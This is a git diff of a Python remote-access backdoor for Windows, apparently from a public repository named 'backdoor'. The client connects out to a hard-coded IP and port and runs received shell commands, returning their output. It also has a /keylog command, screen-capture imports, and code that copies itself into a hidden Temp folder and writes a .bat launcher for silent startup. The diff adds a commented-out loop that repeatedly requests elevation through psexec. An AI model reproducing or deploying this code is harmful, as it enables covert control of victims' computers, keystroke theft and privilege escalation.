@@ -7,7 +7,7 @@
 #twitter: @rossin135
 
 #github: https://github.com/rossiniroberto52/backdoor.git
-import socket, os, subprocess, webbrowser, shutil, winreg
+import socket, os, subprocess, webbrowser, shutil, winreg, ctypes, time, random
 from PIL import ImageGrab
 from pynput.keyboard import Key as key
 from pynput.keyboard import Listener
@@ -19,7 +19,7 @@ from sys import argv
 os.system("cls")
 
 #conn vars
-IP = "192.168.0.18"
+IP = "192.168.0.2"
 PORT = 6667
 
 #most used vars
@@ -55,7 +55,7 @@ def clone():
         path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
         if not os.path.exists(path_to_create):
             os.makedirs(path_to_create)
-        fileToCopy = 'clt.exe'
+        fileToCopy = 'clt.py' #heer too
         shutil.copy2(fileToCopy, path_to_create)
     except:
         msg = "error to create\copy...."
@@ -77,6 +77,17 @@ def bat_create(file_path=""):
         bat_file.write(r'start /b %s\\clt.exe' % file_path)
         msg = "[+] .bat file created!"
         conn.send(msg.encode("utf-8"))
+
+#working process
+
+#def giving_root():
+#    while True:
+#        returno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.py", None, 0)
+#        if returno == 42:
+#           break
+#        else:
+#            print("[/] trying ...." + returno)
+#        time.sleep(random.randint(1,11))
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn.connect((IP,PORT))
@@ -111,10 +122,12 @@ while True:
     if cmd == "/keylog":
         with Listener(on_press = functionPK) as the_listener:  
             the_listener.join()
-
+#    if cmd == "/root":
+#        giving_root()
     os.system(cmd)
     output = subprocess.getoutput(cmd)
     conn.send(output.encode('utf-8'))
     os.system("cls")
+os.system("cls")
 conn.close()
 exit()
